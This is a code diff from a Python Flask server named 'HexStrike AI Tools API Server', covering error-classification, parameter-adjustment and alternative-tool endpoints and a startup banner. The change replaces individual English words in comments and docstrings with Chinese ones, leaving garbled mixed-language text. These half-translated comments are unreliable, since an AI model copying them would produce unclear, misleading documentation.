 def classify_error_endpoint():
-    """Classify an error message"""
+    """Classify an 错误 message"""
     try:
         data = request.get_json()
         error_message = data.get("error_message", "")
@@ -17788,7 +17788,7 @@ def classify_error_endpoint():
 
 @app.route("/api/error-handling/parameter-adjustments", methods=["POST"])
 def get_parameter_adjustments():
-    """Get parameter adjustments for a tool and error type"""
+    """获取 参数 adjustments 用于 a 工具 与 错误 类型"""
     try:
         data = request.get_json()
         tool_name = data.get("tool_name", "")
@@ -17798,7 +17798,7 @@ def get_parameter_adjustments():
         if not tool_name or not error_type_str:
             return jsonify({"error": "tool_name and error_type are required"}), 400
 
-        # Convert string to ErrorType enum
+        # 转换 string 到 ErrorType enum
         try:
             error_type = ErrorType(error_type_str)
         except ValueError:
@@ -17821,7 +17821,7 @@ def get_parameter_adjustments():
 
 @app.route("/api/error-handling/alternative-tools", methods=["GET"])
 def get_alternative_tools():
-    """Get alternative tools for a given tool"""
+    """获取 alternative 工具 用于 a given 工具"""
     try:
         tool_name = request.args.get("tool_name", "")
 
@@ -17842,11 +17842,12 @@ def get_alternative_tools():
         logger.error(f"Error getting alternative tools: {str(e)}")
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
-# Create the banner after all classes are defined
+# 创建 the banner after 全部 classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
 if __name__ == "__main__":
-    # Display the beautiful new banner
+    # 展示 the beautiful new banner
+    print("服务启动横幅如下：")
     print(BANNER)
 
     parser = argparse.ArgumentParser(description="Run the HexStrike AI API Server")
@@ -17861,7 +17862,7 @@ if __name__ == "__main__":
     if args.port != API_PORT:
         API_PORT = args.port
 
-    # Enhanced startup messages with beautiful formatting
+    # 增强 startup messages 使用 beautiful formatting
     startup_info = f"""
 {ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
 {ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']} Starting HexStrike AI Tools API Server{ModernVisualEngine.COLORS['RESET']}
